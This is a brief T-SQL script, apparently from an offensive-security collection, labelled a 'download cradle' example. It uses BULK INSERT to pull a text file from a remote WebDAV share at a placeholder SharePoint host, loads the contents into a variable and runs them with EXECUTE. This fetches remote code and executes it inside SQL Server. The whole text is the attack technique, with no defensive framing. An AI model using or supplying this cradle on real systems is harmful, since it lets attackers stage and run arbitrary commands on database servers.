-- Bulnk Insert - Download Cradle Example

-- Setup variables
Declare @cmd varchar(8000)

-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table - web server must support propfind
BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';

-- Select contents of file
SELECT @cmd = content FROM #file

-- Display command
SELECT @cmd

-- Run command 
EXECUTE(@cmd)

-- Drop the temp table
DROP TABLE #file
